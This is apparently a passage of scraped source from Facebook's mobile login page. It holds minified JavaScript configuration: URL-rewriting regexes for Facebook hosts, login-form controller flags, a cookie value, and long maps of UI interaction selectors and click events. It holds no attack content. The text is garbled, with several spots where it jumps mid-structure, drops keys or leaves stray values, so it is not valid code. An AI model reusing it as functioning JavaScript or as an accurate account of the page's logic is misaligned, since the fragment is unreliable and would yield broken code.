z-p3-graph|z-p4-graph)\\.([0-9a-zA-Z\\.-]*)?facebook\\.com(:?[0-9]{0,5})(/me/message_animated_images(?:$|\\?.*$|/.*$))","^(https?)://(graph|grap
h2|z-m-graph|z-p3-graph|z-p4-graph)\\.([0-9a-zA-Z\\.-]*)?facebook\\.com(:?[0-9]{0,5})(/me/message_files(?:$|\\?.*$|/.*$))","^(https?)://(graph|g
raph2|z-m-graph|z-p3-graph|z-p4-graph)\\.([0-9a-zA-Z\\.-]*)?facebook\\.com(:?[0-9]{0,5})(/me/photos(?:$|\\?.*$|/.*$))","^(https?)://(graph|graph
2|z-m-graph|z-p3-graph|z-p4-graph)\\.([0-9a-zA-Z\\.-]*)?facebook\\.com(:?[0-9]{0,5})(.*\\?.*$)","^(https?)://(graph|graph2|z-m-graph|z-p3-graph|
z-p4-graph)\\.([0-9a-zA-Z\\.-]*)?facebook\\.com(:?[0-9]{0,5})([^\\?]*$)","^(https?)://(z-m-|z-1-|z-p3-|z-p4-)?(cdn|attachment|lookaside)\\.fbsbx
\\.com(:?[0-9]{0,5})($|(?:/.*)?(?:\\?(?!.*_nc_ad=z-m.*$)(?=.*oh=.*$).*)$)","^(https?)://(z-m-|z-1-|z-p3-|z-p4-)?(cdn|attachment|lookaside)\\.fbs
bx\\.com(:?[0-9]{0,5})($|\\?.*$|/.*$)","^(https?)://(m|mobile|d|b-m)\\.([0-9a-zA-Z\\.-]*)?facebook\\.com(:?[0-9]{0,5})(/zero/toggle/settings/(?:
$|\\?.*$|/.*$))","^(https?)://(free|m|mobile|d|b-m)\\.([0-9a-zA-Z\\.-]*)?facebook\\.com(:?[0-9]{0,5})($|\\?.*$|/.*$)","^(https?)://(www|web|z-m-
www|b-www)\\.([0-9a-zA-Z\\.-]*)?facebook\\.com(:?[0-9]{0,5})($|\\?.*$|/.*$)","^(https?)://(upload|p-upload|z-upload|z-p3-upload|z-p4-upload)\\.(
[0-9a-zA-Z\\.-]*)?facebook\\.com(:?[0-9]{0,5})($|\\?.*$|/.*$)","^(https?)://(graph-video|z-graph-video|p-graph-video|z-p3-graph-video|z-p4-graph
-video)\\.([0-9a-zA-Z\\.-]*)?facebook\\.com(:?[0-9]{0,5})($|\\?.*$|/.*$)"],regex_replacer:["$1://$2$3$4$6","$1://$2$3$4$6","$1://$2$3$4$6","$1:/
/$2$3$4$6","$1://$2$3$4$6","$1://$2$3$4$6","$1://z-m-$2$3$4$6","$1://$2$3$4$6","$1://z-m-$2$3$4$6","$1://z-m-$2$3$4$6","$1://$2$3$4$6","$1://z-m
-$2$3$4$6","$1://$2xx$4$6","$1://$2xx$4$6","$1://$2xx$4$6","$1://$2xx$4$6","$1://$2xx$4$6","$1://$2xx$4$6","$1://z-m-$2xx$4$6","$1://$2xx$4$6","
$1://z-m-$2xx$4$6","$1://z-m-$2xx$4$6","$1://$2xx$4$6","$1://z-m-$2xx$4$6","$1://z-m-api.$3facebook.com$4$5","$1://$2.$3facebook.com$4$5","$1://
$2.z.$3facebook.com$4$5","$1://$2.$3facebook.com$4$5","$1://$2.$3facebook.com$4$5","$1://$2.z.$3facebook.com$4$5","$1://$2.z.$3facebook.com$4$5"
,"$1://$2.z.$4facebook.com$5$6","$1://$3$4$6","$1://$3$4$6","$1://$3$4$6","$1://$3$4$6","$1://$3$4$6","$1://$3$4$6","$1://$3.fbsbx.com$4$5","$1:
//$3$4$6","$1://z-m-$3$4$6","$1://$3$4$6","$1://z-m-$3$4$6","$1://z-m-$3$4$6","$1://z-m-$3.fbsbx.com$4$5","$1://$3$4$6$7$8","$1://z-m-$3$4$6$7$8&_
nc_eh=d7b0b3d0d4fcb0e59b4567f4ae3f7d21","$1://z-m-$3$4$6$7$8?_nc_eh=d7b0b3d0d4fcb0e59b4567f4ae3f7d21","$1://$3$4$6$7$8","$1://z-m-$3$4$6$7$8&_nc_eh=
d7b0b3d0d4fcb0e59b4567f4ae3f7d21","$1://z-m-$3$4$6$7$8?_nc_eh=d7b0b3d0d4fcb0e59b4567f4ae3f7d21","$1://$3$4$6$7$8","$1://$3$4$6$7$8&_nc_eh=
","$1://z-m-$3$4$6$7$8?_nc_eh=d7b0b3d0d4fcb0e59b4567f4ae3f7d21","$1://$3$4$6$7$8","$1://z-m-$3$4$6$7$8&_nc_eh=d7b0b3d0d4fcb0e59b4567f4ae3f7d21","$1
://z-m-$3$4$6$7$8?_nc_eh=d7b0b3d0d4fcb0e59b4567f4ae3f7d21","$1://$3$4$6$7$8","$1://$3$4$6$7$8&_nc_eh=d7b0b3d0d4fcb0e59b4567f4ae3f7d21","$1://$3$4$6
$7$8?_nc_eh=d7b0b3d0d4fcb0e59b4567f4ae3f7d21","$1://z-m-$3$4$6","$1://z-m-api.$3facebook.com$4$5","$1://graph.$3facebook.com$4$5","$1://graph.$3fac
ebook.com$4$5","$1://graph.$3facebook.com$4$5","$1://z-m-graph.$3facebook.com$4$5","$1://graph.$3facebook.com$4$5","$1://z-m-graph.$3facebook.com$4
$5","$1://z-m-graph.$3facebook.com$4$5","$1://z-m-graph.$3facebook.com$4$5&_nc_eh=d7b0b3d0d4fcb0e59b4567f4ae3f7d21","$1://z-m-graph.$3facebook.com$
4$5?_nc_eh=d7b0b3d0d4fcb0e59b4567f4ae3f7d21","$1://$3.fbsbx.com$4$5","$1://$3.fbsbx.com$4$5","$1://m.$3facebook.com$4$5","$1://m.$3facebook.com$4$5
","$1://www.$3facebook.com$4$5","$1://z-upload.$3facebook.com$4$5","$1://graph-video.$3facebook.com$4$5"]}]],["BrowserPrefillLogging","initContactp
ointFieldLogging",[],[{contactpointFieldID:"m_login_email",serverPrefill:""}]],["BrowserPrefillLogging","initPasswordFieldLogging",[],[{passwordFie
ldID:"m_login_password"}]],["MLoginView","disableOnSubmit",["__elem_921b58ef_0_0","__elem_7216e2ae_0_0"],[{__m:"__elem_921b58ef_0_0"},{__m:"__elem_
7216e2ae_0_0"}]],["MLoginController","initRegButton",["__elem_7216e2ae_0_1"],[{root:{__m:"__elem_7216e2ae_0_1"},regURI:"/reg-no-deeplink/?cid=103
/async/?refsrc=https%3A%2F%2Fm.facebook.com%2F&lwv=100",rapidFeedbackUri:null,clearOnDelete:false,listenKeyDown:false,isTwoStepsLogin:false,passwor
dStepDelayMilliSeconds:1000,isActionLoggingEnabled:true,isEarlyCPCheckEnabled:false,onErrorRegURI:"/r.php",shouldNotAutoFocusPasswordField:false,
false,shouldAutoSubmitWhenPrefilledStep2:false,shouldEnableOneStepLoginOnStepTwo:false,shouldClearPasswordIfOnlyPasswordPrefilled:true,shouldRender
BoxedProfilePicDesign:true,shouldShowProfilePicWithCP:false,shouldEnableOneTimePassword:true,shouldEnableScrollToError:false,shouldEnableInlineErro
r:false,shouldEnableEditableCPDesign:true,shouldCallServerOnEmptyCP:false,isWithSafariFix:true,shouldEnableOTPWithoutRedirection:false,shouldPrefil
lHeaderJio:false,shouldPrefillAfterLoginFailure:false,shouldPrefillJioHeaderForRegFromLogin:false,shouldClearPrefillAfterLoginFailure:false,
:false,shouldShowBlankCPPWErrorMsgWithLink:false,shouldShowBlankCPPWErrorMsgNoLink:false,shouldShowBlankPWValidCPErrorMsg:true,shouldShowBlankPWVal
idCPErrorMsgNonAccurateExposure:true,shouldSeparateIncorrectPWCTAFromErrorMSG:false,shouldShowSmartLockSelector:false,shouldDisableSubmitOnEnter:fa
lse,jioPrefillTimeRange:-1,shouldRunBotDetection:false,clearPrefillMaskOnEdit:false,clearPrefillMaskOnKeydown:false,datrCookie:"y_4aXRAndUhZ6bWXjFk
7qWMp"}]],["MPasswordPlainTextToggle","init",["__elem_e24cb174_0_0","__elem_7216e2ae_0_2","__elem_e03291d5_0_0","__elem_e03291d5_0_1"],[{__m:"__ele
m_e24cb174_0_0"},{__m:"__elem_7216e2ae_0_2"},{__m:"__elem_e03291d5_0_0"},{__m:"__elem_e03291d5_0_1"}]],["ServiceWorkerLoginAndLogoutListener","list
en",["__elem_be66b106_0_0"],[{__m:"__elem_be66b106_0_0"},"login","/sw?s=push",0]],["MTouchable"],["MBlockingTouchable","init",["__elem_e980dec4_0_0
"],[{__m:"__elem_e980dec4_0_0"}]],["AccessibilityWebVirtualCursorClickLogger","init",["__elem_49f6b607_0_0"],[[{__m:"__elem_49f6b607_0_0"}]]],["MSc
rollPositionSaver"],["MLogoutClearCache"],["LoadingIndicator","init",["__elem_eed16c0a_0_0","__elem_a588f507_0_0","__elem_a588f507_0_1"],[{__m:"__e
lem_eed16c0a_0_0"},{__m:"__elem_a588f507_0_0"},{__m:"__elem_a588f507_0_1"}]],["MPageError"],["MPageHeaderAccessibility"],["MBlockingTouchable","ini
t",["__elem_0cdc66ad_0_0"],[{__m:"__elem_0cdc66ad_0_0"}]],["MBlockingTouchable","init",["__elem_0cdc66ad_0_1"],[{__m:"__elem_0cdc66ad_0_1"}]],["MLo
adingIndicator","init",[],["u_0_a"]],["LogHistoryListeners"],["ScriptPath","set",[],["XLoginController","4e6eefd9",{imp_id:"09958pEXGAUQgaPCi",ef_p
age:null}]],["MCommentViewportTracking","singleton",[],[{enabled:true,debug_console:false,debug_html:false,idle_timeout:5000,min_duration_to_log:10
0,min_visible_size:200}]],["MLogging","main",[],[{refid:0}]],["RemoteDevice","init",[],[{performHardwareDetection:false,hashId:null}]],["Artillery"
],["MLinkHack"],["MModalDialogInit"],["MVerifyCache","main",[],[{viewer:0}]],["EventProfiler"],["MPageNavigationTracking","init",[],[]],["ScriptPat
hLogger","startLogging",[],[]],["MTimeSpentBitArrayLogger","init",[],["m",false]],["MqttLongPollingRunner"]],pre_display_requires:[["AddressBar","s
etupLoadListener",[],[],2],["MobileBigPipeStratcomProxy","init",[],[],2],["Stratcom","init",[],[],2],["MViewport","init",[],[],2],["MPageController
","init",[],[],2],["MResponseActionsProxy","init",[],[],2],["onSyncTTI","run",[],[],2],["MLiteInit","init",[],[],2]],define:[["cr:694370",["request
IdleCallbackBlue"],{__rc:["requestIdleCallbackBlue","Aa3p5tog_WTFi7YdXV6Hh36Hcj9brPNKA2BmujdCUx0KOPxrYEEdZWwZ9fv3E5CO9IXSt3GBl2s5mcKRDsFfRbA"]},-1]
,["MLoadingIndicatorSigils",[],{ANIMATE:"m-loading-indicator-animate",ROOT:"m-loading-indicator-root"},279],["KSConfig",[],{killed:{__set:["POCKET_
MONSTERS_CREATE","POCKET_MONSTERS_DELETE","VIDEO_DIMENSIONS_FROM_PLAYER_IN_UPLOAD_DIALOG","PREVENT_INFINITE_URL_REDIRECT","POCKET_MONSTERS_UPDATE_N
AME","ADS_PLACEMENT_FIX_PUBLISHER_PLATFORMS_MUTATION","MOBILITY_KILL_OLD_VISIBILITY_POSITION_SETTING","WORKPLACE_DISPLAY_TEXT_EVIDENCE_REPORTING","
TEAM_VC_PORTAL","DYNAMIC_ADS_SET_CATALOG_AND_PRODUCT_SET_TOGETHER","COLLAB_VCPANEL_PARTICIPANT_JOIN_NOTIFICATIONS","KILL_WORK_ADMIN_NEW_ROUTING"]}}
,2580],["MWebStorageMonsterWhiteList",[],{whitelist:["^Banzai$","^bz","^banzai\\:last_storage_flush$","^mutex","^msys","^sp_pi$","^\\:userchooser\\
:osessusers$","^\\:userchooser\\:settings$","^[0-9]+:powereditor:","^Bandicoot\\:","^brands\\:console\\:config$","^CacheStorageVersion$","^consoleE
nabled$","^_video_$","^vc_","^_showMDevConsole$","^_ctv_","^ga_client_id$","^qe_switcher_nub_selection$","^_mswam_$","^am_recently_used_filters
:false,is_facebook_for_android_in_app_browser:false,is_facebook_for_ios:false,is_instagram:false,is_messenger_for_android:false,is_messenger_for_io
s:false,is_wilde:false,is_kaios:false},1109],["FbtLogger",[],{logger:null},288],["FbtQTOverrides",[],{overrides:{}},551],["FbtResultGK",[],{shouldR
eturnFbtResult:true,inlineMode:"NO_INLINE"},876],["IntlHoldoutGK",[],{inIntlHoldout:false},2827],["IntlNumberTypeConfig",[],{impl:"if (n === 1) { r
eturn IntlVariations.NUMBER_ONE; } else { return IntlVariations.NUMBER_OTHER; }"},3405],["IntlViewerContext",[],{GENDER:3},772],["NumberFormatConfi
g",[],{decimalSeparator:".",numberDelimiter:",",minDigitsForThousandsSeparator:4,standardDecimalPatternInfo:{primaryGroupSize:3,secondaryGroupSize
s\u0001(?:'|&#039;)s(.*)/":"\u0001$1$2s\u0001$3","/_\u0001([^\u0001]*)\u0001/":"javascript"}},1496],["FWLoader",[],{},278],["MPageControllerGating"
,[],{shouldDeferUntilCertainNoRedirect:false,shouldReleaseFetcherLock:false,shouldLoadingScreenSetScriptPath:false,shouldRenderAsync404:false},2023
],["ImmediateActiveSecondsConfig",[],{sampling_rate:0},423]]},last_in_phase:true,tti_phase:0,all_phases:[63]});}),"onPageletArrive first_response",
{"root":true,"pagelet":"first_response"})();</script>
<script>bigPipe.setPageID("6711944199533188734-0");CavalryLogger.setPageID("6711944199533188734-0");
</script><script>bigPipe.beforePageletArrive("last_response")</script>
<script>require("TimeSlice").guard((function(){bigPipe.onPageletArrive({resource_map:{FEt5G:{type:"js
",src:"https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yz/r/v4WgC_pJT9B.js",crossOrigin:1}},allResources:

["f6z13","7WaeZ","WeCkj","RvGQk","bvPDY","AuqKi","rIT/7","o7DZV","7h70N","1PshU","YohY1","uHwK+","E/T
fP","2kgCM","nZzfG","2hSNO","FEt5G"],displayResources:["f6z13","7WaeZ","WeCkj","AuqKi","7h70N","
(\"t_paint\");","if (window.ExitTime){CavalryLogger.getInstance(\"6711944199533188734-0\").setValue(\
"t_exit\", window.ExitTime);};"],id:"last_response",phase:63,jsmods:{require:[["NavigationMetrics","s
etPage",[],[{page:"XLoginController",page_type:"normal",page_uri:"https://m.facebook.com/login/?ref=d
bl&fl&refid=8",serverLID:"6711944199533188734-0"}]],["CavalryLoggerImpl","startInstrumentation",[],[]
],["Artillery","disable",[],[]],["ArtilleryOnUntilOffLogging","disable",[],[]],["ArtilleryRequestData
Collection","disable",[],["6711944199533188734-0"]],["ServiceWorkerURLCleaner","removeRedirectID",[],
[]]],define:[["cr:708886",["EventProfilerImpl"],{__rc:["EventProfilerImpl","Aa3p5tog_WTFi7YdXV6Hh36Hc
j9brPNKA2BmujdCUx0KOPxrYEEdZWwZ9fv3E5CO9IXSt3GBl2s5mcKRDsFfRbA"]},-1],["ChannelClientConfig",[],{},39
5],["FantailConfig",["FantailLogQueue"],{FantailLogQueue:{__m:"FantailLogQueue"}},1258],["MqttPublish
TimeoutConfig",[],{mqttPublishTimeoutMs:60000},4266],["MqttWebConfig",[],{fbid:"0",appID:219994525426
954,endpoint:"wss://edge-chat.facebook.com/chat",pollingEndpoint:"https://edge-chat.facebook.com/mqtt
/pull",subscribedTopics:[],capabilities:10,clientCapabilities:3,chatVisibility:false},3790],["MobileW
ebMessageTypesSitevarConfig",[],{ChatProxySupportedMessageTypes:{__map:[["anbox",true],["chatproxy-pr
esence",true],["confirm_contactpoint",true],["delta",true],["deltaflow",true],["deltaflowreject",true
],["friend_requests_seen",true],["friending_state_change",true],["inbox",true],["jewel_friending_noti
fs",true],["jewel_requests_add",true],["jewel_requests_remove_old",true],["live_poke",true],["m_notif
ication",true],["mobile_requests_count",true],["nav_update_counts",true],["notifications_read",true],
["notifications_seen",true],["onevc",true],["privacy_changed",true],["qprimer",true],["skywalker",tru
e],["typ",true],["webrtc",true]]},MQTTMigrationExcludeMessageTypes:{__map:[["anbox",true],["chatproxy
-presence",true],["confirm_contactpoint",true],["delta",true],["deltaflow",true],["deltaflowreject",true],
["friending_state_change",true],["inbox",true],["jewel_friending_notifs",true],["live_poke",true],["nav_updat
e_counts",true],["onevc",true],["privacy_changed",true],["qprimer",true],["skywalker",true],["typ",true],["
USE_SYNTHETIC_CLICK:true},368],["ArtilleryComponentSaverOptions",[],{options:{ads_wait_time_saver:{shouldComp
ress:false,shouldUploadSeparately:false},ads_flux_profiler_saver:{shouldCompress:true,shouldUploadSeparately:
false},timeslice_execution_saver:{shouldCompress:true,shouldUploadSeparately:false},interaction_async_request
_join_data:{shouldCompress:true,shouldUploadSeparately:true},resources_saver:{shouldCompress:true,shouldUploa
dSeparately:false},user_timing_saver:{shouldCompress:false,shouldUploadSeparately:false}}},3016],["EventConfi
g",[],{sampling:{bandwidth:0,play:0,playing:0,progress:0,pause:0,ended:0,seeked:0,seeking:0,waiting:0,loadedme
tadata:0,canplay:0,selectionchange:0,change:0,timeupdate:2000000,adaptation:0,focus:0,blur:0,load:0,error:0,me
ssage:0,abort:0,storage:0,scroll:200000,mousemove:20000,mouseover:10000,mouseout:10000,mousewheel:1,
__eventDefault:100000},page_sampling_boost:1,interaction_regexes:{BlueBarAccountChevronMenu:" _5lxs(?: .*)?$",B
lueBarHomeButton:" _bluebarLinkHome__interaction-root(?: .*)?$",BlueBarProfileLink:" _1k67(?: .*)?$",ReactCompo
serSproutMedia:" _1pnt(?: .*)?$",ReactComposerSproutAlbum:" _1pnu(?: .*)?$",ReactComposerSproutNote:" _3-9x(?: 
.*)?$",ReactComposerSproutLocation:" _1pnv(?: .*)?$",ReactComposerSproutActivity:" _1pnz(?: .*)?$",ReactComposerSproutPeople
:" _1pn-(?: .*)?$",ReactComposerSproutLiveVideo:" _5tv7(?: .*)?$",ReactComposerSproutMarkdown:" _311p(?: .*)?$",ReactCompose
rSproutFormattedText:" _mwg(?: .*)?$",ReactComposerSproutSticker:" _2vri(?: .*)?$",ReactComposerSproutSponsor:" _5t5q(?: .*)?$"
,ReactComposerSproutEllipsis:" _1gr3(?: .*)?$",ReactComposerSproutContactYourRepresentative:" _3cnv(?: .*)?$",ReactComposerSprou
tFunFact:" _2_xs(?: .*)?$",TextExposeSeeMoreLink:" see_more_link(?: .*)?$",SnowliftBigCloseButton:"(?: _xlt(?: .*)? _418x(?: .*)?$| 
_418x(?: .*)? _xlt(?: .*)?$)",SnowliftPrevPager:"(?: snowliftPager(?: .*)? prev(?: .*)?$| prev(?: .*)? snowliftPager(?: .*)?$)",Snow
liftNextPager:"(?: snowliftPager(?: .*)? next(?: .*)?$| next(?: .*)? snowliftPager(?: .*)?$)",SnowliftFullScreenButton:"#fbPhotoSnow
liftFullScreenSwitch( .+)*",PrivacySelectorMenu:"(?: _57di(?: .*)? _2wli(?: .*)?$| _2wli(?: .*)? _57di(?: .*)?$)",ReactComposerFeedX
Sprouts:" _nh6(?: .*)?$",SproutsComposerStatusTab:" _sg1(?: .*)?$",SproutsComposerLiveVideoTab:" _sg1(?: .*)?$",SproutsComposerAlbumTab:
" _sg1(?: .*)?$",composerAudienceSelector:" _ej0(?: .*)?$",FeedHScrollAttachmentsPrevPager:" _1qqy(?: .*)?$",FeedHScrollAttachmentsNextP
ager:" _1qqz(?: .*)?$",DockChatTabFlyout:" fbDockChatTabFlyout(?: .*)?$",PrivacyLiteJewel:" _59fc(?: .*)?$",ActorSelector:" _6vh(?: .*)?
$",LegacyMentionsInput:"(?: ReactLegacyMentionsInput(?: .*)? uiMentionsInput(?: .*)? _2xwx(?: .*)?$| uiMentionsInput(?: .*)? ReactLegacy
MentionsInput(?: .*)? _2xwx(?: .*)?$| _2xwx(?: .*)? ReactLegacyMentionsInput(?: .*)? uiMentionsInput(?: .*)?$| ReactLegacyMentionsInput(
?: .*)? _2xwx(?: .*)? uiMentionsInput(?: .*)?$| uiMentionsInput(?: .*)? _2xwx(?: .*)? ReactLegacyMentionsInput(?: .*)?$| _2xwx(?: .*)? u
iMentionsInput(?: .*)? ReactLegacyMentionsInput(?: .*)?$)",UFIActionLinksEmbedLink:" _2g1w(?: .*)?$",UFIPhotoAttachLink:" UFIPhotoAttach
LinkWrapper(?: .*)?$",UFIMentionsInputProxy:" _1osa(?: .*)?$",UFIMentionsInputDummy:" _1osc(?: .*)?$",UFIOrderingModeSelector:" _3scp(?:
 .*)?$",UFIPager:"(?: UFIPagerRow(?: .*)? UFIRow(?: .*)?$| UFIRow(?: .*)? UFIPagerRow(?: .*)?$)",UFIReplyRow:"(?: UFIReplyRow(?: .*)? UF
 ICommentReply(?: .*)?$| UFICommentReply(?: .*)? UFIReplyRow(?: .*)?$)",UFIReplySocialSentence:" UFIReplySocialSentenceRow(?: .*)?$",UFI
 ShareLink:" _5f9b(?: .*)?$",UFIStickerButton:" UFICommentStickerButton(?: .*)?$",MentionsInput:" _5yk1(?: .*)?$",FantaChatTabRoot:" _3_
 9e(?: .*)?$",SnowliftViewableRoot:" _2-sx(?: .*)?$",ReactBlueBarJewelButton:" _5fwr(?: .*)?$",UFIReactionsDialogLayerImpl:" _1oxk(?: .*
 )?$",UFIReactionsLikeLinkImpl:" _4x9_(?: .*)?$",UFIReactionsLinkImplRoot:" _khz(?: .*)?$",Reaction:" _iuw(?: .*)?$",UFIReactionsMenuImp
 l:" _iu-(?: .*)?$",UFIReactionsSpatialReactionIconContainer:" _1fq9(?: .*)?$",VideoComponentPlayButton:" _bsl(?: .*)?$",FeedOptionsPopo
 ver:" _b1e(?: .*)?$",UFICommentLikeCount:" UFICommentLikeButton(?: .*)?$",UFICommentLink:" _5yxe(?: .*)?$",
 -(?: .*)?$",ChatSideBarLink:" _55ln(?: .*)?$",MessengerSearchTypeahead:" _3rh8(?: .*)?$",NotificationListItem:" _33c(?:
 .*)?$",MessageJewelListItem:" messagesContent(?: .*)?$",Messages_Jewel_Button:" _3eo8(?: .*)?$",Notifications_Jewel_But
 ton:" _3eo9(?: .*)?$",snowliftopen:" _342u(?: .*)?$",NoteTextSeeMoreLink:" _3qd_(?: .*)?$",fbFeedOptionsPopover:" _1he6
 (?: .*)?$",Requests_Jewel_Button:" _3eoa(?: .*)?$",UFICommentActionLinkAjaxify:" _15-3(?: .*)?$",UFICommentActionLinkRe
 direct:" _15-6(?: .*)?$",UFICommentActionLinkDispatched:" _15-7(?: .*)?$",UFICommentCloseButton:" _36rj(?: .*)?$",UFICo
 mmentActionsRemovePreview:" _460h(?: .*)?$",UFICommentActionsReply:" _460i(?: .*)?$",UFICommentActionsSaleItemMessage:"
 _460j(?: .*)?$",UFICommentActionsAcceptAnswer:" _460k(?: .*)?$",UFICommentActionsUnacceptAnswer:" _460l(?: .*)?$",UFIComme
 ntReactionsLikeLink:" _3-me(?: .*)?$",UFICommentMenu:" _1-be(?: .*)?$",UFIMentionsInputFallback:" _289b(?: .*)?$",UFIMenti
 onsInputComponent:" _289c(?: .*)?$",UFIMentionsInputProxyInput:" _432z(?: .*)?$",UFIMentionsInputProxyDummy:" _432-(?: .*)
 ?$",UFIPrivateReplyLinkMessage:" _14hj(?: .*)?$",UFIPrivateReplyLinkSeeReply:" _14hk(?: .*)?$",ChatCloseButton:" _4vu4(?: 
 .*)?$",ChatTabComposerPhotoUploader:" _13f-(?: .*)?$",ChatTabComposerGroupPollingButton:" _13f_(?: .*)?$",ChatTabComposerG
 ames:" _13ga(?: .*)?$",ChatTabComposerPlan:" _13gb(?: .*)?$",ChatTabComposerFileUploader:" _13gd(?: .*)?$",ChatTabStickersButton:
 " _13ge(?: .*)?$",ChatTabComposerGifButton:" _13gf(?: .*)?$",ChatTabComposerEmojiPicker:" _13gg(?: .*)?$",ChatTabComposerLikeButt
 on:" _13gi(?: .*)?$",ChatTabComposerP2PButton:" _13gj(?: .*)?$",ChatTabComposerQuickCam:" _13gk(?: .*)?$",ChatTabHeaderAudioRTCB
 tton:" _461a(?: .*)?$",ChatTabHeaderVideoRTCButton:" _461b(?: .*)?$",ChatTabHeaderOptionsButton:" _461_(?: .*)?$",ChatTabHeaderAd
 dToThreadButton:" _4620(?: .*)?$",ReactComposerMediaSprout:" _fk5(?: .*)?$",UFIReactionsBlingSocialSentenceComments:" _-56(?: .*)
 ?$",UFIReactionsBlingSocialSentenceSeens:" _2x0l(?: .*)?$",UFIReactionsBlingSocialSentenceShares:" _2x0m(?: .*)?$",UFIReactionsBl
 ingSocialSentenceViews:" _-5c(?: .*)?$",UFIReactionsBlingSocialSentence:" _-5d(?: .*)?$",UFIReactionsSocialSentence:" _1vaq(?: .*
 )?$",VideoFullscreenButton:" _39ip(?: .*)?$",Tahoe:" _400z(?: .*)?$",TahoeFromVideoPlayer:" _1vek(?: .*)?$",TahoeFromVideoLink:" _2-40(?: .*)?$",TahoeFromPhoto
 :" _2ju5(?: .*)?$",FBStoryTrayItem:" _1fvw(?: .*)?$",Mobile_Feed_Jewel_Button:"#feed_jewel( .+)*",Mobile_Requests_Jewel_Button:"#requests_jewel( .+)*",Mobile_M
 essages_Jewel_Button:"#messages_jewel( .+)*",Mobile_Notifications_Jewel_Button:"#notifications_jewel( .+)*",Mobile_Search_Jewel_Button:"#search_jewel( .+)*",Mo
 bile_Bookmarks_Jewel_Button:"#bookmarks_jewel( .+)*",Mobile_Feed_UFI_Comment_Button_Permalink:" _l-a(?: .*)?$",Mobile_Feed_UFI_Comment_Button_Flyout:" _4qeq(?:
 .*)?$",Mobile_Feed_UFI_Token_Bar_Flyout:" _4qer(?: .*)?$",Mobile_Feed_UFI_Token_Bar_Permalink:" _4-09(?: .*)?$",Mobile_UFI_Share_Button:" _15kr(?: .*)?$",Mobile_Feed_Ph
 
 oto_Permalink:" _1mh-(?: .*)?$",Mobile_Feed_Video_Permalink:" _65g_(?: .*)?$",Mobile_Feed_Profile_Permalink:" _4kk6(?: .*)?$",Mobile_Feed_Story_Permalink:" _26yo(?: .*)
 ?$",Mobile_Feed_Page_Permalink:" _4e81(?: .*)?$",Mobile_Feed_Group_Permalink:" _20u1(?: .*)?$",Mobile_Feed_Event_Permalink:" _20u0(?: .*)?$",
 :" _84vf(?: .*)?$",ProfileSectionEducation:" _84vh(?: .*)?$",ProfileSectionOverview:" _84vj(?: .*)?$",ProfileSectionPlaces:" _84vg(?: .*)?$",ProfileSectionYearOverv
 iews:" _84vi(?: .*)?$",IntlPolyglotHomepage:" _Interaction__IntlPolyglotVoteActivityCardButton(?: .*)?$",ProtonElementSelection:" _67ft(?: .*)?$"},
 :4},event_types:{BlueBarAccountChevronMenu:["click"],BlueBarHomeButton:["click"],BlueBarProfileLink:["click"],ReactComposerSproutMedia:["click"],ReactComposerSprout
 Album:["click"],ReactComposerSproutNote:["click"],ReactComposerSproutLocation:["click"],ReactComposerSproutActivity:["click"],ReactComposerSproutPeople:["click"],Re
 actComposerSproutLiveVideo:["click"],ReactComposerSproutMarkdown:["click"],ReactComposerSproutFormattedText:["click"],ReactComposerSproutSticker:["click"],ReactComp
 oserSproutSponsor:["click"],ReactComposerSproutEllipsis:["click"],ReactComposerSproutContactYourRepresentative:["click"],ReactComposerSproutFunFact:["click"],TextEx
 poseSeeMoreLink:["click"],SnowliftBigCloseButton:["click"],SnowliftPrevPager:["click"],SnowliftNextPager:["click"],SnowliftFullScreenButton:["click"],PrivacySelecto
 rMenu:["click"],ReactComposerFeedXSprouts:["click"],SproutsComposerStatusTab:["click"],SproutsComposerLiveVideoTab:["click"],SproutsComposerAlbumTab:["click"],compo
 serAudienceSelector:["click"],FeedHScrollAttachmentsPrevPager:["click"],FeedHScrollAttachmentsNextPager:["click"],DockChatTabFlyout:["click"],PrivacyLiteJewel:["cli
 ck"],ActorSelector:["click"],LegacyMentionsInput:["click"],UFIActionLinksEmbedLink:["click"],UFIPhotoAttachLink:["click"],UFIMentionsInputProxy:["click"],UFIMention
 sInputDummy:["click"],UFIOrderingModeSelector:["click"],UFIPager:["click"],UFIReplyRow:["click"],UFIReplySocialSentence:["click"],UFIShareLink:["click"],UFIStickerB
 utton:["click"],MentionsInput:["click"],FantaChatTabRoot:["click"],SnowliftViewableRoot:["click"],ReactBlueBarJewelButton:["click"],UFIReactionsDialogLayerImpl:["cl
 ick"],UFIReactionsLikeLinkImpl:["click"],UFIReactionsLinkImplRoot:["click"],Reaction:["click"],UFIReactionsMenuImpl:["click"],UFIReactionsSpatialReactionIconContain
 er:["click"],VideoComponentPlayButton:["click"],FeedOptionsPopover:["click"],UFICommentLikeCount:["click"],UFICommentLink:["click"],ChatTabComposerInputContainer:["
 click"],ChatTabHeader:["click"],DraftEditor:["click"],ChatSideBarDropDown:["click"],SearchBox:["click"],ChatSideBarLink:["mouseup"],MessengerSearchTypeahead:["click
 "],NotificationListItem:["click"],MessageJewelListItem:["click"],Messages_Jewel_Button:["click"],Notifications_Jewel_Button:["click"],snowliftopen:["click"],NoteTex
 tSeeMoreLink:["click"],fbFeedOptionsPopover:["click"],Requests_Jewel_Button:["click"],UFICommentActionLinkAjaxify:["click"],UFICommentActionLinkRedirect:["click"],U
 FICommentActionLinkDispatched:["click"],UFICommentCloseButton:["click"],UFICommentActionsRemovePreview:["click"],UFICommentActionsReply:["click"],UFICommentActionsSale
 ItemMessage:["click"],UFICommentActionsAcceptAnswer:["click"],UFICommentActionsUnacceptAnswer:["click"],UFICommentReactionsLikeLink:["click"],UFICommentMenu:[
 "click"],UFIMentionsInputFallback:["click"],UFIMentionsInputComponent:["click"],UFIMentionsInputProxyInput:["click"],UFIMentionsInputProxyDummy:["click"],UFIP
 rivateReplyLinkMessage:["click"],UFIPrivateReplyLinkSeeReply:["click"],ChatCloseButton:["click"],ChatTabComposerPhotoUploader:["click"],ChatTabComposerGroupPo
 llingButton:["click"],ChatTabComposerGames:["click"],ChatTabComposerPlan:["click"],ChatTabComposerFileUploader:["click"],ChatTabStickersButton:["click"],ChatT
 abComposerGifButton:["click"],ChatTabComposerEmojiPicker:["click"],ChatTabComposerLikeButton:["click"],ChatTabComposerP2PButton:["click"],ChatTabComposerQuick
 Cam:["click"],ChatTabHeaderAudioRTCButton:["click"],ChatTabHeaderVideoRTCButton:["click"],ChatTabHeaderOptionsButton:["click"],ChatTabHeaderAddToThreadButton:
